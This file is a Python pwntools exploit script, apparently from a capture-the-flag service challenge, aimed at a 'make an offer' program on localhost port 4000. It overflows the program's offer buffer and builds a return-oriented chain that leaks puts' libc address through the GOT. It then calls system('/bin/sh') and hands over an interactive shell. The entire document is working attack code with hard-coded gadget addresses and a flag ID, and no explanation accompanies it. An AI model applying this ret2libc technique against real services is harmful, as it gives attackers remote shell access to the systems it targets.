from pwn import *
import sys
import pexpect
import pexpect.fdpexpect
from binascii import hexlify

LIBCPATH='/lib/x86_64-linux-gnu/libc.so.6'

host = '127.0.0.1'
port = 4000

e = elf.ELF(LIBCPATH)
offset = e.symbols['system'] - e.symbols['puts']
binsh_offset = next(e.search("/bin/sh")) - e.symbols['puts']

conn = remote(host, port)

gadget = 0x401613  # pop rdi; ret;
puts_got = 0x602020
puts_plt = 0x400890
main = 0x4014b1


def offer_value(x):
    print conn.recvuntil("offer?")
    conn.sendline("{0}".format(x))

def exploit(ip, port, flag_id):
    content = "test"

    print conn.recvuntil("?: ")
    conn.sendline("3")
    print conn.recvuntil("ID: ")
    conn.sendline(flag_id)
    print conn.recvuntil("?: ")

    conn.sendline("1")
    conn.sendline("62996904")
    print conn.recvuntil("?: ")
    conn.sendline("1")    

    for i in range(127):
        offer_value(2)


    offer_value(gadget)
    offer_value(puts_got)
    offer_value(puts_plt)
    offer_value(main - 2)
    offer_value(main - 1)
    
    msg = conn.recvuntil("?: ")

    print msg

    msg = msg[msg.find("\nHi!") - 6: msg.find("\nHi!")]
    puts_in_libc = "\x00\x00"+msg[5]+msg[4]+msg[3]+msg[2]+msg[1]+msg[0]
    puts_in_libc_int = int(enhex(puts_in_libc), 16)

    system_in_libc = puts_in_libc_int + offset
    binsh_in_libc = puts_in_libc_int + binsh_offset

    conn.sendline("3")
    print conn.recvuntil("ID: ")
    conn.sendline(flag_id)
    print conn.recvuntil("?: ")

    conn.sendline("1")
    conn.sendline("421206250831408")
    print conn.recvuntil("?: ")
    conn.sendline("1")    

    for i in range(127):
        offer_value(2)

    offer_value(gadget)
    offer_value(binsh_in_libc)
    offer_value(system_in_libc)
    offer_value(10)
    offer_value(15)

    conn.interactive()

    return {'FLAG': content}


if __name__ == "__main__":
    print exploit(host, port, "KmxQtsWSihlhWMk")
